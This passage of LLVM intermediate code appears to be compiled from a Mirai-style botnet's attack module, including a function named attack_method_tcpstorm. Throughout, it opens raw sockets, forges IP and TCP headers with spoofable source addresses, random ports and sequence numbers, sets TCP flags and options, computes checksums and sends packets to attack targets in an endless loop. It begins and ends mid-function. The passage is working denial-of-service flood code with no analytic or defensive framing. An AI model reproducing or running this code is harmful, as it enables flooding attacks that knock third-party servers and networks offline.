; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, 15
  %135 = or i8 %134, 64
  store i8 %135, i8* %132, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = and i8 %138, -16
  %140 = or i8 %139, 5
  store i8 %140, i8* %137, align 4
  %141 = load i8, i8* %12, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = call zeroext i16 @htons(i16 zeroext 60) #7
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 2
  store i16 %144, i16* %146, align 2
  %147 = load i16, i16* %13, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %147) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 3
  store i16 %148, i16* %150, align 4
  %151 = load i8, i8* %14, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 5
  store i8 %151, i8* %153, align 4
  %154 = load i8, i8* %15, align 1
  %155 = icmp ne i8 %154, 0
  br i1 %155, label %156, label %160

; <label>:156:                                    ; preds = %113
  %157 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 4
  store i16 %157, i16* %159, align 2
  br label %160

; <label>:160:                                    ; preds = %156, %113
  %161 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 6
  store i8 6, i8* %162, align 1
  %163 = load i32, i32* %26, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 8
  store i32 %163, i32* %165, align 4
  %166 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %167 = load i32, i32* %9, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 1
  %171 = load i32, i32* %170, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 9
  store i32 %171, i32* %173, align 4
  %174 = load i16, i16* %16, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  store i16 %175, i16* %177, align 4
  %178 = load i16, i16* %17, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 1
  store i16 %179, i16* %181, align 2
  %182 = load i32, i32* %18, align 4
  %183 = trunc i32 %182 to i16
  %184 = call zeroext i16 @htons(i16 zeroext %183) #7
  %185 = zext i16 %184 to i32
  %186 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 2
  store i32 %185, i32* %187, align 4
  %188 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = and i16 %190, -241
  %192 = or i16 %191, 160
  store i16 %192, i16* %189, align 4
  %193 = load i8, i8* %20, align 1
  %194 = sext i8 %193 to i16
  %195 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %196 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %195, i32 0, i32 4
  %197 = load i16, i16* %196, align 4
  %198 = and i16 %194, 1
  %199 = shl i16 %198, 13
  %200 = and i16 %197, -8193
  %201 = or i16 %200, %199
  store i16 %201, i16* %196, align 4
  %202 = load i8, i8* %21, align 1
  %203 = sext i8 %202 to i16
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %203, 1
  %208 = shl i16 %207, 12
  %209 = and i16 %206, -4097
  %210 = or i16 %209, %208
  store i16 %210, i16* %205, align 4
  %211 = load i8, i8* %22, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 11
  %218 = and i16 %215, -2049
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %23, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 10
  %227 = and i16 %224, -1025
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %24, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 9
  %236 = and i16 %233, -513
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %25, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %239, 1
  %244 = shl i16 %243, 8
  %245 = and i16 %242, -257
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8*, i8** %29, align 8
  %248 = getelementptr inbounds i8, i8* %247, i32 1
  store i8* %248, i8** %29, align 8
  store i8 2, i8* %247, align 1
  %249 = load i8*, i8** %29, align 8
  %250 = getelementptr inbounds i8, i8* %249, i32 1
  store i8* %250, i8** %29, align 8
  store i8 4, i8* %249, align 1
  %251 = call i32 @rand_next()
  %252 = and i32 %251, 15
  %253 = add i32 1458, %252
  %254 = trunc i32 %253 to i16
  %255 = call zeroext i16 @htons(i16 zeroext %254) #7
  %256 = load i8*, i8** %29, align 8
  %257 = bitcast i8* %256 to i16*
  store i16 %255, i16* %257, align 2
  %258 = load i8*, i8** %29, align 8
  %259 = getelementptr inbounds i8, i8* %258, i64 2
  store i8* %259, i8** %29, align 8
  %260 = load i8*, i8** %29, align 8
  %261 = getelementptr inbounds i8, i8* %260, i32 1
  store i8* %261, i8** %29, align 8
  store i8 4, i8* %260, align 1
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i32 1
  store i8* %263, i8** %29, align 8
  store i8 2, i8* %262, align 1
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 8, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 10, i8* %266, align 1
  %268 = call i32 @rand_next()
  %269 = load i8*, i8** %29, align 8
  %270 = bitcast i8* %269 to i32*
  store i32 %268, i32* %270, align 4
  %271 = load i8*, i8** %29, align 8
  %272 = getelementptr inbounds i8, i8* %271, i64 4
  store i8* %272, i8** %29, align 8
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 0, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = getelementptr inbounds i8, i8* %277, i32 1
  store i8* %278, i8** %29, align 8
  store i8 1, i8* %277, align 1
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %29, align 8
  store i8 3, i8* %279, align 1
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 3, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 8, i8* %283, align 1
  br label %285

; <label>:285:                                    ; preds = %160
  %286 = load i32, i32* %9, align 4
  %287 = add nsw i32 %286, 1
  store i32 %287, i32* %9, align 4
  br label %108

; <label>:288:                                    ; preds = %108
  br label %289

; <label>:289:                                    ; preds = %436, %288
  store i32 0, i32* %9, align 4
  br label %290

; <label>:290:                                    ; preds = %433, %289
  %291 = load i32, i32* %9, align 4
  %292 = load i8, i8* %5, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp slt i32 %291, %293
  br i1 %294, label %295, label %436

; <label>:295:                                    ; preds = %290
  %296 = load i8**, i8*** %11, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds i8*, i8** %296, i64 %298
  %300 = load i8*, i8** %299, align 8
  store i8* %300, i8** %30, align 8
  %301 = load i8*, i8** %30, align 8
  %302 = bitcast i8* %301 to %struct.iphdr*
  store %struct.iphdr* %302, %struct.iphdr** %31, align 8
  %303 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i64 1
  %305 = bitcast %struct.iphdr* %304 to %struct.tcphdr*
  store %struct.tcphdr* %305, %struct.tcphdr** %32, align 8
  %306 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %307 = load i32, i32* %9, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %306, i64 %308
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %309, i32 0, i32 2
  %311 = load i8, i8* %310, align 4
  %312 = zext i8 %311 to i32
  %313 = icmp slt i32 %312, 32
  br i1 %313, label %314, label %335

; <label>:314:                                    ; preds = %295
  %315 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %316 = load i32, i32* %9, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %315, i64 %317
  %319 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i32 0, i32 1
  %320 = load i32, i32* %319, align 4
  %321 = call i32 @ntohl(i32 %320) #7
  %322 = call i32 @rand_next()
  %323 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %324 = load i32, i32* %9, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i64 %325
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %326, i32 0, i32 2
  %328 = load i8, i8* %327, align 4
  %329 = zext i8 %328 to i32
  %330 = lshr i32 %322, %329
  %331 = add i32 %321, %330
  %332 = call i32 @htonl(i32 %331) #7
  %333 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i32 0, i32 9
  store i32 %332, i32* %334, align 4
  br label %335

; <label>:335:                                    ; preds = %314, %295
  %336 = load i32, i32* %26, align 4
  %337 = icmp eq i32 %336, -1
  br i1 %337, label %338, label %342

; <label>:338:                                    ; preds = %335
  %339 = call i32 @rand_next()
  %340 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 8
  store i32 %339, i32* %341, align 4
  br label %342

; <label>:342:                                    ; preds = %338, %335
  %343 = load i16, i16* %13, align 2
  %344 = zext i16 %343 to i32
  %345 = icmp eq i32 %344, 65535
  br i1 %345, label %346, label %352

; <label>:346:                                    ; preds = %342
  %347 = call i32 @rand_next()
  %348 = and i32 %347, 65535
  %349 = trunc i32 %348 to i16
  %350 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 3
  store i16 %349, i16* %351, align 4
  br label %352

; <label>:352:                                    ; preds = %346, %342
  %353 = load i16, i16* %16, align 2
  %354 = zext i16 %353 to i32
  %355 = icmp eq i32 %354, 65535
  br i1 %355, label %356, label %362

; <label>:356:                                    ; preds = %352
  %357 = call i32 @rand_next()
  %358 = and i32 %357, 65535
  %359 = trunc i32 %358 to i16
  %360 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %361 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %360, i32 0, i32 0
  store i16 %359, i16* %361, align 4
  br label %362

; <label>:362:                                    ; preds = %356, %352
  %363 = load i16, i16* %17, align 2
  %364 = zext i16 %363 to i32
  %365 = icmp eq i32 %364, 65535
  br i1 %365, label %366, label %372

; <label>:366:                                    ; preds = %362
  %367 = call i32 @rand_next()
  %368 = and i32 %367, 65535
  %369 = trunc i32 %368 to i16
  %370 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 1
  store i16 %369, i16* %371, align 2
  br label %372

; <label>:372:                                    ; preds = %366, %362
  %373 = load i32, i32* %18, align 4
  %374 = icmp eq i32 %373, 65535
  br i1 %374, label %375, label %379

; <label>:375:                                    ; preds = %372
  %376 = call i32 @rand_next()
  %377 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 2
  store i32 %376, i32* %378, align 4
  br label %379

; <label>:379:                                    ; preds = %375, %372
  %380 = load i32, i32* %19, align 4
  %381 = icmp eq i32 %380, 65535
  br i1 %381, label %382, label %386

; <label>:382:                                    ; preds = %379
  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 3
  store i32 %383, i32* %385, align 4
  br label %386

; <label>:386:                                    ; preds = %382, %379
  %387 = load i8, i8* %20, align 1
  %388 = icmp ne i8 %387, 0
  br i1 %388, label %389, label %395

; <label>:389:                                    ; preds = %386
  %390 = call i32 @rand_next()
  %391 = and i32 %390, 65535
  %392 = trunc i32 %391 to i16
  %393 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %394 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %393, i32 0, i32 7
  store i16 %392, i16* %394, align 2
  br label %395

; <label>:395:                                    ; preds = %389, %386
  %396 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 7
  store i16 0, i16* %397, align 2
  %398 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %399 = bitcast %struct.iphdr* %398 to i16*
  %400 = call zeroext i16 @checksum_generic(i16* %399, i32 20)
  %401 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 7
  store i16 %400, i16* %402, align 2
  %403 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 6
  store i16 0, i16* %404, align 4
  %405 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = bitcast %struct.tcphdr* %406 to i8*
  %408 = call zeroext i16 @htons(i16 zeroext 40) #7
  %409 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %405, i8* %407, i16 zeroext %408, i32 40)
  %410 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 6
  store i16 %409, i16* %411, align 4
  %412 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 1
  %414 = load i16, i16* %413, align 2
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 1
  store i16 %414, i16* %420, align 2
  %421 = load i32, i32* %10, align 4
  %422 = load i8*, i8** %30, align 8
  %423 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %424 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %425 = load i32, i32* %9, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %424, i64 %426
  %428 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i32 0, i32 0
  %429 = bitcast %struct.sockaddr_in* %428 to %struct.sockaddr*
  store %struct.sockaddr* %429, %struct.sockaddr** %423, align 8
  %430 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %431 = load %struct.sockaddr*, %struct.sockaddr** %430, align 8
  %432 = call i64 @sendto(i32 %421, i8* %422, i64 60, i32 16384, %struct.sockaddr* %431, i32 16)
  br label %433

; <label>:433:                                    ; preds = %395
  %434 = load i32, i32* %9, align 4
  %435 = add nsw i32 %434, 1
  store i32 %435, i32* %9, align 4
  br label %290

; <label>:436:                                    ; preds = %290
  br label %289

; <label>:437:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstorm(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 1458)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %429

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %429

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %266, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %269

; <label>:123:                                    ; preds = %118
  store i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.257, i32 0, i32 0), i8** %31, align 8
  %124 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 124
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = and i8 %143, 15
  %145 = or i8 %144, 64
  store i8 %145, i8* %142, align 4
  %146 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = and i8 %148, -16
  %150 = or i8 %149, 5
  store i8 %150, i8* %147, align 4
  %151 = load i8, i8* %12, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 1
  store i8 %151, i8* %153, align 1
  %154 = load i32, i32* %26, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 40, %155
  %157 = trunc i64 %156 to i16
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 2
  store i16 %158, i16* %160, align 2
  %161 = load i16, i16* %13, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.iphdr*, %struct.iphdr** %29, align 8
